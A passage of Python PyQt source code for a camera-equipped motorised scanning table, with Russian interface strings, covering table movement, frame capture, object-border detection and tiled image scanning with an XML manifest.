= QSpinBox()\n        self.edt_border_x2 = QSpinBox()\n        self.edt_border_y2 = QSpinBox()\n        self.btn_border = QPushButton(\"\u041e\u043f\u0440\u0435\u0434\u0435\u043b\u0438\u0442\u044c \u0433\u0440\u0430\u043d\u0438\u0446\u044b\")\n        self.btn_scan = QPushButton(\"\u041d\u043e\u0432\u0430\u044f \u0441\u044a\u0435\u043c\u043a\u0430\")\n        self.btn_scan_without_borders = QPushButton(\"\u0421\u044a\u0435\u043c\u043a\u0430 \u0431\u0435\u0437 \u0433\u0440\u0430\u043d\u0438\u0446\")\n        self.btn_save_scan = QPushButton(\"\u0421\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c \u0441\u044a\u0435\u043c\u043a\u0443\")\n        self.clear_test_data()\n        self.init_ui()\n    def init_ui(self):\n        menu_bar = self.menuBar()\n        device_menu = menu_bar.addMenu(\"&\u0421\u0442\u0430\u043d\u043e\u043a\")\n        device_menu_action_init = QAction(\"&\u0418\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f\", self)\n        device_menu_action_init.setShortcut(\"Ctrl+I\")\n        device_menu_action_init.triggered.connect(self.device_init)\n        device_menu.addAction(device_menu_action_init)\n        device_menu.addSeparator()\n        device_menu_action_check = QAction(\"&\u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430\", self)\n        device_menu_action_check.setShortcut(\"Ctrl+C\")\n        device_menu_action_check.triggered.connect(self.device_check)\n        device_menu.addAction(device_menu_action_check)\n        device_menu.addSeparator()\n        device_menu_action_move = QAction(\"&\u0414\u0432\u0438\u0433\u0430\u0442\u044c\", self)\n        device_menu_action_move.setShortcut(\"Ctrl+M\")\n        device_menu_action_move.triggered.connect(self.device_move)\n        device_menu.addAction(device_menu_action_move)\n        device_menu.addSeparator()\n        device_menu_action_test_circle = QAction(\"&\u041a\u0440\u0443\u0433\", self)\n        device_menu_action_test_circle.triggered.connect(self.test_circle)\n        device_menu.addAction(device_menu_action_test_circle)\n        device_menu.addSeparator()\n        device_menu_action_exit = QAction(\"&\u0412\u044b\u0439\u0442\u0438\", self)\n        device_menu_action_exit.setShortcut(\"Ctrl+Q\")\n        device_menu_action_exit.setStatusTip(\"\u0417\u0430\u043a\u0440\u044b\u0442\u044c \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435\")\n        device_menu_action_exit.triggered.connect(self.close)\n        device_menu.addAction(device_menu_action_exit)\n        menu_bar.addMenu(device_menu)\n        services_menu = menu_bar.addMenu(\"&\u0421\u0435\u0440\u0432\u0438\u0441\")\n        services_menu_action_settings = QAction(\"&\u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438\", self)\n        services_menu_action_settings.triggered.connect(self.services_menu_action_settings_click)\n        services_menu.addAction(services_menu_action_settings)\n        menu_bar.addMenu(services_menu)\n        main_widget = QWidget(self)\n        central_layout = QHBoxLayout()\n        main_widget.setLayout(central_layout)\n        self.setCentralWidget(main_widget)\n        left_layout = QVBoxLayout()\n        central_layout.addLayout(left_layout)\n        self.scroll_area_img.setWidget(self.lbl_img)\n        self.scroll_area_img.setWidgetResizable(True)\n        self.scrollbar_img_hor.setMaximum(self.scroll_area_img.horizontalScrollBar().maximum())\n        self.scrollbar_img_hor.valueChanged.connect(self.sync_scroll)\n        self.scrollbar_img_vert.setMaximum(self.scroll_area_img.verticalScrollBar().maximum())\n        self.scrollbar_img_vert.valueChanged.connect(self.sync_scroll)\n        self.lbl_img.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)\n        self.lbl_img.setStyleSheet(\"border: 1px solid red\")\n        left_layout.addWidget(self.scroll_area_img)\n        right_layout = QVBoxLayout()\n        central_layout.addLayout(right_layout)\n        right_layout.addWidget(self.lbl_coord)\n        self.btn_init.clicked.connect(self.device_init)\n        right_layout.addWidget(self.btn_init)\n        self.btn_move.clicked.connect(self.device_move)\n        right_layout.addWidget(self.btn_move)\n        self.btn_move_work_height.clicked.connect(self.device_move_work_height)\n        right_layout.addWidget(self.btn_move_work_height)\n        self.btn_move_mid.clicked.connect(self.device_move_mid)\n        right_layout.addWidget(self.btn_move_mid)\n        self.btn_manual.setCheckable(True)\n        self.btn_manual.setChecked(False)\n        self.btn_manual.toggled[\"bool\"].connect(self.device_manual)\n        right_layout.addWidget(self.btn_manual)\n        border_layout = QVBoxLayout()\n        right_layout.addStretch()\n        right_layout.addLayout(border_layout)\n        border_layout.addWidget(QLabel(\"\u0413\u0440\u0430\u043d\u0438\u0446\u044b \u0441\u044a\u0435\u043c\u043a\u0438:\"))\n        border_form_layout = QFormLayout()\n        for edt in [self.edt_border_x1, self.edt_border_y1, self.edt_border_x2, self.edt_border_y2]:\n            edt.setMaximumHeight(30)\n            edt.setMinimum(0)\n            edt.setSuffix(\" mm\")\n            edt.setButtonSymbols(QAbstractSpinBox.NoButtons)\n            edt.setSingleStep(0)\n        self.edt_border_x1.setMaximum(self.program_settings.table_settings.limits_mm[0])\n        self.edt_border_x2.setMaximum(self.program_settings.table_settings.limits_mm[0])\n        self.edt_border_y1.setMaximum(self.program_settings.table_settings.limits_mm[1])\n        self.edt_border_y2.setMaximum(self.program_settings.table_settings.limits_mm[1])\n        border_form_layout.addRow(QLabel(\"x1\"), self.edt_border_x1)\n        border_form_layout.addRow(QLabel(\"y1\"), self.edt_border_y1)\n        border_form_layout.addRow(QLabel(\"x2\"), self.edt_border_x2)\n        border_form_layout.addRow(QLabel(\"y2\"), self.edt_border_y2)\n        border_form_layout.setSpacing(0)\n        border_layout.addLayout(border_form_layout)\n        right_layout.addWidget(self.btn_border)\n        self.btn_border.clicked.connect(self.border_find)\n        right_layout.addWidget(self.btn_scan)\n        self.btn_scan.clicked.connect(self.scan)\n        right_layout.addWidget(self.btn_scan_without_borders)\n        self.btn_scan_without_borders.clicked.connect(self.scan_without_borders)\n        right_layout.addWidget(self.btn_save_scan)\n        self.btn_save_scan.clicked.connect(self.save_scan)\n        self.btn_save_scan.setEnabled(False)\n        self.installEventFilter(self)\n        self.resize(1280, 720)\n        self.move(300, 300)\n        self.setMinimumSize(800, 600)\n    def sync_scroll(self):\n        self.scroll_area_img.horizontalScrollBar().setValue(self.scrollbar_img_hor.value())\n    def __get_pixels_in_mm(self):\n        return self.program_settings.snap_settings.pixels_in_mm\n    pixels_in_mm = property(__get_pixels_in_mm)\n    def __get_snap_width(self):\n        return self.program_settings.snap_settings.snap_width\n    snap_width = property(__get_snap_width)\n    def __get_snap_height(self):\n        return self.program_settings.snap_settings.snap_height\n    snap_height = property(__get_snap_height)\n    def __get_snap_width_mm(self):\n        return self.snap_width / self.pixels_in_mm[0]\n    snap_width_mm = property(__get_snap_width_mm)\n    def __get_snap_height_mm(self):\n        return self.snap_height / self.pixels_in_mm[1]\n    snap_height_mm = property(__get_snap_height_mm)\n    def __get_work_height(self):\n        return self.program_settings.snap_settings.work_height\n    work_height = property(__get_work_height)\n    def __get_delta_x(self):\n        return int(self.frame_width / 10)\n    delta_x = property(__get_delta_x)\n    def __get_delta_y(self):\n        return int(self.frame_height / 10)\n    delta_y = property(__get_delta_y)\n    def __get_frame_width(self):\n        return self.program_settings.snap_settings.frame[2] - self.program_settings.snap_settings.frame[0]\n    frame_width = property(__get_frame_width)\n    def __get_frame_height(self):\n        return self.program_settings.snap_settings.frame[3] - self.program_settings.snap_settings.frame[1]\n    frame_height = property(__get_frame_height)\n    def __get_frame_width_mm(self):\n        return self.frame_width / self.pixels_in_mm[0]\n    frame_width_mm = property(__get_frame_width_mm)\n    def __get_frame_height_mm(self):\n        return self.frame_height / self.pixels_in_mm[1]\n    frame_height_mm = property(__get_frame_height_mm)\n    def __get_frame(self):\n        return self.program_settings.snap_settings.frame\n    frame = property(__get_frame)\n    def snap(self, x1: int, y1: int, x2: int, y2: int, crop=False):\n        if self.test:\n            time.sleep(0.05)\n            y2_r = 6400 - y1\n            y1_r = 6400 - y2\n            return np.copy(self.test_img[y1_r:y2_r, x1:x2, :])\n        else:\n            time.sleep(0.15)\n            for i in range(10):\n                self.video_stream.read()\n            check, img = self.video_stream.read()\n            self.lbl_img.setPixmap(self.vidik.numpy_to_pixmap(img))\n            self.lbl_img.repaint()\n            if crop:\n                return np.copy(img[self.frame[1]:self.frame[3], self.frame[0]:self.frame[2], :])\n            else:\n                return np.copy(img)\n    def coord_move(self, coord, mode=\"discrete\", crop=False):\n        if not self.test and mode != \"continuous\":\n            self.vidik.work = False\n        self.table_controller.coord_move(coord, mode)\n        self.setWindowTitle(str(self.table_controller))\n        if self.table_controller.test or mode != \"continuous\":\n            snap = self.snap(int(self.pixels_in_mm[0] * (self.table_controller.coord_mm[0])),\n                             int(self.pixels_in_mm[1] * (self.table_controller.coord_mm[1])),\n                             int(self.pixels_in_mm[0] * (self.table_controller.coord_mm[0] + self.snap_width_mm)),\n                             int(self.pixels_in_mm[1] * (self.table_controller.coord_mm[1] + self.snap_height_mm)),\n                             crop=crop)\n            if self.test:\n                self.lbl_img.setPixmap(self.vidik.numpy_to_pixmap(snap))\n                self.lbl_img.repaint()\n            return snap\n        self.vidik.work = True\n        return None\n    def closeEvent(self, event):\n        if self.unsaved:\n            dlg_result = QMessageBox.question(self,\n                                              \"Confirm Dialog\",\n                                              \"\u0414\u0430\u043d\u043d\u044b\u0435 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0439 \u0441\u044a\u0435\u043c\u043a\u0438 \u043d\u0435 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u044b. \u0425\u043e\u0442\u0438\u0442\u0435 \u0441\u043f\u0435\u0440\u0432\u0430 \u0438\u0445 \u0441\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c?\",\n                                              QMessageBox.Yes | QMessageBox.No | QMessageBox.Cancel,\n                                              QMessageBox.Yes)\n            if dlg_result == QMessageBox.Yes:\n                if not self.save_scan():\n                    event.ignore()\n                    return\n            elif dlg_result == QMessageBox.Cancel:\n                event.ignore()\n                return\n        self.main_window.show()\n        time.sleep(0.01)\n        self.hide()\n        event.ignore()\n        self.closed = True\n    def services_menu_action_settings_click(self):\n        if self.program_settings.test:\n            QMessageBox.warning(self, \"Warning!\",\n                                \"\u041f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430 \u0440\u0430\u0431\u043e\u0442\u0430\u0435\u0442 \u0432 \u0442\u0435\u0441\u0442\u043e\u0432\u043e\u043c \u0440\u0435\u0436\u0438\u043c\u0435. \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438 \u043d\u0435 \u0431\u0443\u0434\u0443\u0442 \u0441\u043e\u0445\u0440\u0430\u043d\u044f\u0442\u044c\u0441\u044f!\",\n                                QMessageBox.Ok, QMessageBox.Ok)\n        settings_dialog = SettingsDialog(self.program_settings)\n        settings_dialog.setAttribute(Qt.WA_DeleteOnClose)\n        dlg_result = settings_dialog.exec()\n        if dlg_result > 0:\n            self.table_controller.server_status = 'uninitialized'\n    def device_init(self):\n        self.vidik.work = False\n        self.control_elements_enabled(False)\n        self.table_controller.coord_init()\n        self.setWindowTitle(str(self.table_controller))\n        self.coord_move(self.table_controller.coord_mm, mode=\"discrete\", crop=True)\n        self.control_elements_enabled(True)\n        self.vidik.work = True\n    def device_check(self):\n        self.table_controller.coord_check()\n        self.setWindowTitle(str(self.table_controller))\n    def device_move(self):\n        self.vidik.work = False\n        self.control_elements_enabled(False)\n        input_dialog = QInputDialog()\n        text, ok = input_dialog.getText(self,\n                                        \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b \u0432 \u043c\u0438\u043b\u043b\u0438\u043c\u0435\u0442\u0440\u0430\u0445\",\n                                        \"\u041a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b:\",\n                                        QLineEdit.Normal,\n                                        \"{0:.2f}; {1:.2f}; {2:.2f}\".format(self.table_controller.coord_mm[0],\n                                                                         self.table_controller.coord_mm[1],\n                                                                         self.table_controller.coord_mm[2]))\n        if ok:\n            coord = [float(item) for item in str.replace(str.replace(text, ',', '.'), ' ', '').split(';')]\n            if len(coord) == 3:\n                self.coord_move(coord)\n                self.setWindowTitle(str(self.table_controller))\n        self.control_elements_enabled(True)\n        self.vidik.work = True\n    def device_move_mid(self):\n        self.vidik.work = False\n        self.control_elements_enabled(False)\n        x = int(self.table_controller.limits_mm[0] / 2)\n        y = int(self.table_controller.limits_mm[1] / 3)\n        self.coord_move([x, y, self.table_controller.coord_mm[2]])\n        self.setWindowTitle(str(self.table_controller))\n        self.control_elements_enabled(True)\n        self.vidik.work = True\n    def device_move_work_height(self):\n        self.vidik.work = False\n        self.control_elements_enabled(False)\n        self.coord_move([self.table_controller.coord_mm[0],\n                         self.table_controller.coord_mm[1],\n                         self.work_height])\n        self.setWindowTitle(str(self.table_controller))\n        self.control_elements_enabled(True)\n        self.vidik.work = True\n    def device_manual(self, status):\n        if status:\n            self.continuous_mode = True\n            self.timer_continuous.start()\n        else:\n            self.timer_continuous.stop()\n            self.continuous_mode = False\n    def control_elements_enabled(self, status):\n        self.btn_init.setEnabled(status)\n        self.btn_move.setEnabled(status)\n        self.btn_move_mid.setEnabled(status)\n        self.btn_move_work_height.setEnabled(status)\n        self.btn_border.setEnabled(status)\n        self.btn_scan.setEnabled(status)\n        self.btn_save_scan.setEnabled(status)\n        self.edt_border_x1.setEnabled(status)\n        self.edt_border_y1.setEnabled(status)\n        self.edt_border_x2.setEnabled(status)\n        self.edt_border_y2.setEnabled(status)\n    @staticmethod\n    def save_test_data(data):\n        f = open('test.txt', 'a')\n        now = datetime.datetime.now()\n        f.write(now.strftime(\"%d.%m.%Y %H:%M:%S\") + \"<=\" + str(data) + '\\r\\n')\n        f.close()\n    @staticmethod\n    def clear_test_data():\n        f = open('test.txt', 'w+')\n        f.seek(0)\n        f.close()\n    def test_circle(self):\n        self.main_window.show()\n        self.close()\n    def border_find(self):\n        self.vidik.work = False\n        self.control_elements_enabled(False)\n        try:\n            if self.table_controller.server_status == 'uninitialized':\n                self.table_controller.coord_init()\n            x = int(self.table_controller.limits_mm[0] / 2)\n            y = int(self.table_controller.limits_mm[1] / 3)\n            if self.test:\n                y = int(self.table_controller.limits_mm[1] / 2)\n            snap = self.coord_move([x, y, self.table_controller.coord_mm[2]], mode=\"discrete\", crop=True)\n            all_x = list()\n            all_y = list()\n            all_x.append(x)\n            all_y.append(y)\n            direction = Direction()\n            while direction.abs_index < 6:\n                print(direction)\n                forward_over_move = 4\n                forward_count_total = 0\n                previous_direction = direction.previous()\n                self.save_test_data(\"direction=\" + str(direction))\n                while True:\n                    if direction.abs_index > 0:\n                        stuck = False\n                        correction_list = list()\n                        while not stuck:\n                            correction_count = self.check_object_middle(snap,\n                                                                        previous_direction,\n                                                                        [self.delta_x, self.delta_y])\n                            correction_list.append(correction_count)\n                            if len(correction_list) >= 4:\n                                if correction_list[-1] == correction_list[-3]:\n                                    if correction_list[-2] == correction_list[-4]:\n                                        if correction_list[-1] * correction_list[-2] < 0:\n                                            correction_count //= 2\n                                            stuck = True\n                                            self.save_test_data(\"unstuck doubled!\")\n                                if len(correction_list) >= 12:\n                                    stuck = True\n                                    self.save_test_data(\"unstuck loop repeatedly!\")\n                            if correction_count == 0:\n                                break\n                            while True:\n                                x += int(self.delta_x * correction_count * previous_direction[0] / self.pixels_in_mm[0])\n                                y -= int(self.delta_y * correction_count * previous_direction[1] / self.pixels_in_mm[1])\n                                if x < 0 or y < 0 or x > self.table_controller.limits_mm[0] or y > \\\n                                        self.table_controller.limits_mm[1]:\n                                    x = all_x[-1]\n                                    y = all_y[-1]\n                                    correction_count -= int(abs(correction_count) / correction_count)\n                                    if correction_count == 0:\n                                        break\n                                else:\n                                    break\n                            if correction_count == 0:\n                                break\n                            all_x.append(x)\n                            all_y.append(y)\n                            snap = self.coord_move([x, y, self.table_controller.coord_mm[2]], mode=\"discrete\", crop=True)\n                            if correction_count > 0:\n                                self.save_test_data('x = ' + str(x) + '; y = ' + str(y) + ' inside correction')\n                            elif correction_count < 0:\n                                self.save_test_data('x = ' + str(x) + '; y = ' + str(y) + ' outside correction')\n                    forward_count = self.find_border_in_image(snap,\n                                                              direction,\n                                                              [self.delta_x, self.delta_y],\n                                                              forward_over_move)\n                    if forward_count > 0:\n                        while True:\n                            x += int(self.delta_x * direction[0] * forward_count / self.pixels_in_mm[0])\n                            y -= int(self.delta_y * direction[1] * forward_count / self.pixels_in_mm[1])\n                            if x < 0 or y < 0 or x > self.table_controller.limits_mm[0] or y > \\\n                                    self.table_controller.limits_mm[1]:\n                                x = all_x[-1]\n                                y = all_y[-1]\n                                forward_count -= 1\n                                if forward_count <= 0:\n                                    break\n                            else:\n                                break\n                        if forward_count <= 0:\n                            break\n                        all_x.append(x)\n                        all_y.append(y)\n                        forward_count_total += forward_count\n                        snap = self.coord_move([x, y, self.table_controller.coord_mm[2]], mode=\"discrete\", crop=True)\n                        self.save_test_data('x = ' + str(x) + '; y = ' + str(y))\n                    else:\n                        if forward_count_total > forward_over_move:\n                            all_x.pop()\n                            all_y.pop()\n                            x += int(self.delta_x * direction[0] * (-forward_over_move) / self.pixels_in_mm[0])\n                            y -= int(self.delta_y * direction[1] * (-forward_over_move) / self.pixels_in_mm[1])\n                            all_x.append(x)\n                            all_y.append(y)\n                            snap = self.coord_move([x, y, self.table_controller.coord_mm[2]], mode=\"discrete\", crop=True)\n                            self.save_test_data('x = ' + str(x) + '; y = ' + str(y) + ' forward correction')\n                        break\n                direction = direction.next()\n            print(\"all_x=\" + str(all_x))\n            print(\"all_y=\" + str(all_y))\n            min_x = min(all_x) + 3 * self.delta_x / self.pixels_in_mm[0]\n            min_y = min(all_y) + 3 * self.delta_y / self.pixels_in_mm[1]\n            max_x = max(all_x) - 3 * self.delta_x / self.pixels_in_mm[0]\n            max_y = max(all_y) - 3 * self.delta_y / self.pixels_in_mm[1]\n            self.edt_border_x1.setValue(min_x)\n            self.edt_border_y1.setValue(min_y)\n            self.edt_border_x2.setValue(max_x)\n            self.edt_border_y2.setValue(max_y)\n        except Exception as e:\n            raise\n            QMessageBox.critical(self, \"\u041a\u0440\u0438\u0442\u0438\u0447\u0435\u0441\u043a\u0430\u044f \u043e\u0448\u0438\u0431\u043a\u0430\", \"\u041f\u0440\u043e\u0438\u0437\u043e\u0448\u043b\u0430 \u043e\u0448\u0438\u0431\u043a\u0430 \u0432\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u044f\" + str(e),\n                                 QMessageBox.Ok, QMessageBox.Ok)\n        finally:\n            self.control_elements_enabled(True)\n            QMessageBox.information(self, \"Info Dialog\", \"\u0413\u0440\u0430\u043d\u0438\u0446\u044b \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u0435\u043d\u044b\", QMessageBox.Ok, QMessageBox.Ok)\n            self.vidik.work = True\n    def exp_border_find(self):\n        pass\n    @staticmethod\n    def find_border_in_image(img, direction, delta, forward_over_move=0):\n        index = abs(direction[1])\n        middle = int(img.shape[1 - index] / 2)\n        if direction[index] > 0:\n            middle -= 1\n        coord = [0, 0]\n        for i in range(5, -4, -1):\n            coord[index] = middle + i * delta[index] * direction[index]\n            for j in range(img.shape[index]):\n                coord[1 - index] = j\n                for k in range(3):\n                    if img[coord[1]][coord[0]][k] < 128:\n                        return i + forward_over_move\n        return 0\n    @staticmethod\n    def check_object_middle(img, direction, delta):\n        index = abs(direction[1])\n        non_white_limit = int(0.03 * img.shape[index])\n        middle = int(img.shape[1 - index] / 2)\n        if direction[index] > 0:\n            middle -= 1\n        coord = [0, 0]\n        for i in range(5, -6, -1):\n            coord[index] = middle + i * delta[index] * direction[index]\n            if coord[index] >= img.shape[1 - index]:\n                coord[index] -= img.shape[1 - index] - 1\n            if coord[index] < 0:\n                coord[index] = 0\n            non_white_count = 0\n            for j in range(img.shape[index]):\n                coord[1 - index] = j\n                for k in range(3):\n                    if img[coord[1]][coord[0]][k] < 128:\n                        non_white_count += 1\n                        break\n            if non_white_count > non_white_limit:\n                return i\n        return -5\n    def scan(self):\n        self.vidik.work = False\n        if self.unsaved:\n            dlg_result = QMessageBox.question(self,\n                                              \"Confirm Dialog\",\n                                              \"\u0414\u0430\u043d\u043d\u044b\u0435 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0439 \u0441\u044a\u0435\u043c\u043a\u0438 \u043d\u0435 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u044b. \u0425\u043e\u0442\u0438\u0442\u0435 \u0441\u043f\u0435\u0440\u0432\u0430 \u0438\u0445 \u0441\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c?\",\n                                              QMessageBox.Yes | QMessageBox.No | QMessageBox.Cancel,\n                                              QMessageBox.Yes)\n            if dlg_result == QMessageBox.Yes:\n                if not self.save_scan():\n                    return\n            elif dlg_result == QMessageBox.Cancel:\n                return\n        try:\n            coord = [float(self.edt_border_x1.value()), float(self.edt_border_y1.value()),\n                     float(self.edt_border_x2.value()), float(self.edt_border_y2.value())]\n        except ValueError:\n            print(\"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0444\u043e\u0440\u043c\u0430\u0442 \u0434\u0430\u043d\u043d\u044b\u0445\")\n            return\n        if self.table_controller.server_status == 'uninitialized':\n            self.table_controller.coord_init()\n        frame_size_mm = [self.frame_width_mm, self.frame_height_mm]\n        count = [0, 0]\n        for i in range(2):\n            x_overage = (coord[i + 2] - coord[i]) % frame_size_mm[i]\n            count[i] = int((coord[i + 2] - coord[i]) // frame_size_mm[i]) + 1\n            if x_overage > 0:\n                x_deficit = frame_size_mm[i] - x_overage\n                count[i] += 1\n                coord[i] -= x_deficit / 2\n                coord[i + 2] += x_deficit / 2\n                if coord[i] < 0:\n                    coord[i + 2] -= coord[i]\n                    coord[i] = 0\n                if coord[i + 2] > self.table_controller.limits_mm[i]:\n                    coord[i] -= coord[i + 2] - self.table_controller.limits_mm[i]\n                    coord[i + 2] = self.table_controller.limits_mm[i]\n                if coord[i] < 0:\n                    coord[i] += x_overage / 2\n                    coord[i + 2] -= x_overage / 2\n                    count[i] -= 1\n        print(\"x1={0}; y1={1}; x2={2}; y2={3}\".format(coord[0], coord[1], coord[2], coord[3]))\n        if not os.path.exists(self.dir_for_img):\n            os.mkdir(self.dir_for_img)\n        for file in os.listdir(self.dir_for_img):\n            os.remove(os.path.join(self.dir_for_img, file))\n        left_dir = abs(self.table_controller.coord_mm[0] - coord[0]) > abs(self.table_controller.coord_mm[0] - coord[2])\n        j_start = 0\n        j_finish = count[1]\n        j_delta = 1\n        if abs(self.table_controller.coord_mm[1] - coord[1]) > abs(self.table_controller.coord_mm[1] - coord[3]):\n            j_start = count[1] - 1\n            j_finish = -1\n            j_delta = -1\n        for j in range(j_start, j_finish, j_delta):\n            y = coord[1] + j * self.frame_height_mm\n            j_r = count[1] - 1 - j\n            if left_dir:\n                x_range = range(count[0] - 1, -1, -1)\n            else:\n                x_range = range(0, count[0], 1)\n            for i in x_range:\n                x = coord[0] + i * self.frame_width_mm\n                snap = self.coord_move([x, y, self.table_controller.coord_mm[2]], mode=\"discrete\")\n                cv2.imwrite(os.path.join(self.dir_for_img, \"S_{0}_{1}.jpg\".format(j_r + 1, i + 1)), snap[:, :, :])\n                print('x = ' + str(x) + '; y = ' + str(y))\n            left_dir = not left_dir\n        root = Xml.Element(\"Root\")\n        elem_rc = Xml.Element(\"RowCount\")\n        elem_rc.text = str(count[1])\n        root.append(elem_rc)\n        elem_cc = Xml.Element(\"ColCount\")\n        elem_cc.text = str(count[0])\n        root.append(elem_cc)\n        elem_img = Xml.Element(\"Image\")\n        root.append(elem_img)\n        img_format = Xml.SubElement(elem_img, \"Format\")\n        img_format.text = \"jpg\"\n        img_size = Xml.SubElement(elem_img, \"ImgSize\")\n        img_size_width = Xml.SubElement(img_size, \"Width\")\n        img_size_width.text = str(self.snap_width)\n        img_size_height = Xml.SubElement(img_size, \"Height\")\n        img_size_height.text = str(self.snap_height)\n        img_con_area = Xml.SubElement(elem_img, \"ConnectionArea\")\n        ica_x = Xml.SubElement(img_con_area, \"X\")\n        ica_x.text = str(self.program_settings.snap_settings.frame[0])\n        ica_y = Xml.SubElement(img_con_area, \"Y\")\n        ica_y.text = str(self.program_settings.snap_settings.frame[1])\n        ica_width = Xml.SubElement(img_con_area, \"Width\")\n        ica_width.text = str(self.program_settings.snap_settings.frame[2]\n                             - self.program_settings.snap_settings.frame[0])\n        ica_height = Xml.SubElement(img_con_area, \"Height\")\n        ica_height.text = str(self.program_settings.snap_settings.frame[3]\n                              - self.program_settings.snap_settings.frame[1])\n        tree = Xml.ElementTree(root)\n        with open(self.path_for_xml_file, \"w\"):\n            tree.write(self.path_for_xml_file)\n        self.btn_save_scan.setEnabled(True)\n        self.unsaved = True\n        self.vidik.work = True\n        self.save_scan()\n    @staticmethod\n    def img_is_empty(img, delta):\n        coord = [0, 0]\n        for index in range(2):\n            non_white_limit = int(0.03 * img.shape[index])\n            middle = int(img.shape[1 - index] / 2)\n            for i in range(-5, 6):\n                coord[index] = middle + i * delta[index]\n                if i == 5:\n                    coord[index] -= 1\n                non_white_count = 0\n                for j in range(img.shape[index]):\n                    coord[1 - index] = j\n                    for k in range(3):\n                        if img[coord[1]][coord[0]][k] < 128:\n                            non_white_count += 1\n                            break\n                if non_white_count > non_white_limit:\n                    return False\n        return True\n    def scan_without_borders(self):\n        self.vidik.work = False\n        files_img_count = 0\n        if self.unsaved:\n            dlg_result = QMessageBox.question(self,\n                                              \"Confirm Dialog\",\n                                              \"\u0414\u0430\u043d\u043d\u044b\u0435 \u043f\u043e\u0441\u043b\u0435\u0434\u043d\u0435\u0439 \u0441\u044a\u0435\u043c\u043a\u0438 \u043d\u0435 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u044b. \u0425\u043e\u0442\u0438\u0442\u0435 \u0441\u043f\u0435\u0440\u0432\u0430 \u0438\u0445 \u0441\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c?\",\n                                              QMessageBox.Yes | QMessageBox.No | QMessageBox.Cancel,\n                                              QMessageBox.Yes)\n            if dlg_result == QMessageBox.Yes:\n                if not self.save_scan():\n                    return\n            elif dlg_result == QMessageBox.Cancel:\n                return\n        if self.table_controller.server_status == 'uninitialized':\n            self.table_controller.coord_init()\n            x = int(self.table_controller.limits_mm[0] / 2)\n            y = int(self.table_controller.limits_mm[1] / 3)\n            if self.test:\n                y = int(self.table_controller.limits_mm[1] / 2)\n            z = self.work_height\n            snap = self.coord_move([x, y, z], mode=\"discrete\", crop=True)\n        else:\n            snap = self.coord_move(self.table_controller.coord_mm, mode=\"discrete\", crop=True)\n        delta = [self.delta_x, self.delta_y]\n        current_pos_index = []\n        coordinates_x_mm = []\n        x_mm = self.table_controller.coord_mm[0] % self.frame_width_mm\n        current_pos_index.append(int(self.table_controller.coord_mm[0] // self.frame_width_mm))\n        while x_mm < self.table_controller.limits_mm[0]:\n            coordinates_x_mm.append(x_mm)\n            x_mm += self.frame_width_mm\n        coordinates_y_mm = []\n        y_mm = self.table_controller.coord_mm[1] % self.frame_height_mm\n        current_pos_index.append(int(self.table_controller.coord_mm[1] // self.frame_height_mm))\n        while y_mm < self.table_controller.limits_mm[1]:\n            coordinates_y_mm.append(y_mm)\n            y_mm += self.frame_height_mm\n        img_file_matrix = []\n        img_obj_matrix = []\n        for i in range(len(coordinates_x_mm)):\n            new_file_x = []\n            new_obj_x = []\n            for j in range(len(coordinates_y_mm)):\n                new_file_x.append('')\n                new_obj_x.append(False)\n            img_file_matrix.append(new_file_x)\n            img_obj_matrix.append(new_obj_x)\n        check_range = 3\n        img_empty = self.img_is_empty(snap, delta)\n        offset = [0, 0]\n        index = 1\n        if (current_pos_index[0] - check_range >= 0 and current_pos_index[1] - check_range >= 0\n            and current_pos_index[0] + check_range < len(coordinates_x_mm)\n                and current_pos_index[1] + check_range < len(coordinates_y_mm)):\n            while img_empty:\n                if offset[index] < check_range:\n                    offset[index] += 1\n                else:\n                    if offset[1 - index] == 0:\n                        offset[1 - index] -= check_range\n                    else:\n                        offset[index] -= check_range\n                        index = 1 - index\n                if index == 1 and offset[0] == 0 and offset[1] == 0:\n                    break\n                x = coordinates_x_mm[current_pos_index[0] + offset[0]]\n                y = coordinates_y_mm[current_pos_index[1] + offset[1]]\n                z = self.table_controller.coord_mm[2]\n                snap = self.coord_move([x, y, z], mode=\"discrete\", crop=True)\n                if not self.img_is_empty(snap, delta):\n                    img_empty = False\n        self.save_test_data(\"img_empty=\" + str(img_empty))\n        self.save_test_data(\"offset=\" + str(offset))\n        if img_empty:\n            QMessageBox.warning(self, \"\u0412\u043d\u0438\u043c\u0430\u043d\u0438\u0435!\", \"\u0418\u0437\u0434\u0435\u043b\u0438\u0435 \u043d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u043e!\", QMessageBox.Ok, QMessageBox.Ok)\n            return\n        current_pos_index[0] += offset[0]\n        current_pos_index[1] += offset[1]\n        if not os.path.exists(self.dir_for_img):\n            os.mkdir(self.dir_for_img)\n        for file in os.listdir(self.dir_for_img):\n            os.remove(os.path.join(self.dir_for_img, file))\n        file_name = os.path.join(self.dir_for_img, \"scan_{0}.jpg\".format(files_img_count))\n        cv2.imwrite(file_name, snap)\n        img_file_matrix[current_pos_index[0]][current_pos_index[1]] = file_name\n        img_obj_matrix[current_pos_index[0]][current_pos_index[1]] = True\n        files_img_count += 1\n        snap_area_limits_x = [current_pos_index[0], current_pos_index[0]]\n        snap_area_limits_y = [current_pos_index[1], current_pos_index[1]]\n        direction_y = -1\n        start_x_pos_index = current_pos_index[0]\n        empty_column = False\n        for 